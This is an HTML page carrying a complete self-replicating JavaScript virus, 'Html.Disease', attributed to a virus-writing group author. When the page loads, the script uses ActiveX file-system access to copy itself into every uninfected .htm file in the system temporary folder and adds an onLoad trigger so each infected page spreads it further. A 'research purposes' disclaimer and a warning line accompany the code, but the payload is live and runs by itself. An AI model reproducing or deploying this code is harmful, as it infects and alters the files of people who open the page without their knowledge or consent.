<html>

<head>
<meta http-equiv="Content-Type"
content="text/html; charset=iso-8859-1">
<meta name="AUTHOR"
content="Bumblebee/[Hail and Kill]">
<meta name="GENERATOR" content="Microsoft FrontPage Express 2.0">
<title>Html.Disease</title>
</head>

<body bgcolor="#FFFFFF" onLoad="Disease()">
<script language="JavaScript" xx>
// Html.Disease
// Coded by Bumblebee
// This is a Html virus coded only for research
// purposes. Do not distribute. The author is
// not responsible for any damages caused due to
// use this file. Have fun!
function Disease() {
var fso,files,folder,fitem,file,s,r,virus,virusPath,host;
fso=new ActiveXObject("Scripting.FileSystemObject");
virusPath=window.location.pathname;
virusPath=virusPath.slice(1);
file=fso.openTextFile(virusPath,1);
virus=file.readAll();
file.close();
s=virus.search(new RegExp("<script language=\"JavaScript\" xx>"));
r=virus.search(new RegExp("End"+"Of"+"Virus"));
r+=21;
virus=virus.slice(s,r);
folder=fso.GetSpecialFolder(2);
files=new Enumerator(folder.Files);
for(;!files.atEnd();files.moveNext()) {
fitem=files.item();
s=fitem.Name;
if(s.search(new RegExp(".htm"))!=-1) {
file=fso.openTextFile(fitem.Path,1);
host=file.readAll();
file.close();
if(host.search(new RegExp("Html.Disease"))==-1) {
s=host.search(new RegExp("[Bb][Oo][Dd][Yy]"));
s+=4;
r=host.slice(0,s);
host=host.slice(s);
file=fso.openTextFile(fitem.Path,2);
file.write(r);
file.write(" onLoad=\"Disease()\"");
s=host.search(">");
s++;
r=host.slice(0,s);
host=host.slice(s);
file.writeline(r);
file.write(virus);
file.write(host);
file.close();
}
}
}
}
//EndOfVirus
</script>

<p>WARNING - This page contains a Html Disease - WARNING</p>
</body>
</html>
